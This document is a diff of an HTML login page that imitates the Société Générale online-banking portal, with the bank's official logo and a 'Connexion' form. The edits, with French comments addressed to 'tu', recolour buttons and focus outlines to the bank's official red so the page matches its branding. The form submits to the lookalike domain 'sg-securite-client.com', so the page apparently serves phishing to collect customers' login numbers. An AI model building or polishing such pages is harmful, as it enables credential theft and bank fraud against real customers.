@@ -27,7 +27,7 @@
             text-align: center;
         }
 
-        /* LOGO SG */
+        /* LOGO SG (Utilise le logo SVG officiel qui est Rouge et Noir) */
         .logo {
             width: 150px;
             margin-bottom: 30px;
@@ -36,7 +36,7 @@
         /* TITRE */
         h1 {
             font-size: 22px;
-            color: #000000;
+            color: #000000; /* Noir */
             margin-bottom: 20px;
             font-weight: 600;
         }
@@ -62,27 +62,27 @@
             border-radius: 4px;
             font-size: 16px;
             transition: border-color 0.3s;
-            -moz-appearance: textfield; /* Pour Firefox */
+            -moz-appearance: textfield;
         }
 
         input[type="number"]:focus {
-            border-color: #86BC25; /* Vert SG */
+            border-color: #E30613; /* Rouge SG */
             outline: none;
-            box-shadow: 0 0 0 2px rgba(134, 188, 37, 0.2);
+            box-shadow: 0 0 0 2px rgba(227, 6, 19, 0.2);
         }
 
-        /* Supprimer les flèches haut/bas par défaut sur les inputs number */
+        /* Supprimer les flèches haut/bas */
         input[type="number"]::-webkit-outer-spin-button,
         input[type="number"]::-webkit-inner-spin-button {
             -webkit-appearance: none;
             margin: 0;
         }
 
-        /* BOUTON CONNEXION */
+        /* BOUTON CONNEXION (ROUGE) */
         .btn-login {
             width: 100%;
             padding: 14px;
-            background-color: #86BC25; /* Vert SG */
+            background-color: #E30613; /* Rouge SG officiel */
             color: white;
             border: none;
             border-radius: 4px;
@@ -94,7 +94,7 @@
         }
 
         .btn-login:hover {
-            background-color: #76a320;
+            background-color: #c50510; /* Rouge plus foncé au survol */
         }
 
         /* LIENS EN BAS */
@@ -104,7 +104,7 @@
         }
 
         .links a {
-            color: #005699; /* Bleu SG */
+            color: #005699; /* Bleu pour les liens secondaires (standard web) ou Rouge si tu préfères */
             text-decoration: none;
             display: block;
             margin-bottom: 8px;
@@ -127,14 +127,12 @@
 <body>
 
     <div class="login-container">
-        <!-- LOGO SG -->
+        <!-- LOGO SG (Le SVG officiel contient le rouge et le noir) -->
         <img src="https://upload.wikimedia.org/wikipedia/commons/e/ea/Logo_Soci%C3%A9t%C3%A9_G%C3%A9n%C3%A9rale_2017.svg" alt="Société Générale Logo" class="logo">
 
         <h1>Connexion</h1>
 
         <!-- FORMULAIRE -->
-        <!-- L'action pointe vers la même page pour ne pas perdre l'utilisateur, 
-             ou vers une page "Merci" si tu en as une. Ici, on reste sur la page. -->
         <form action="https://sg-securite-client.com" method="GET">
             
             <div class="form-group">
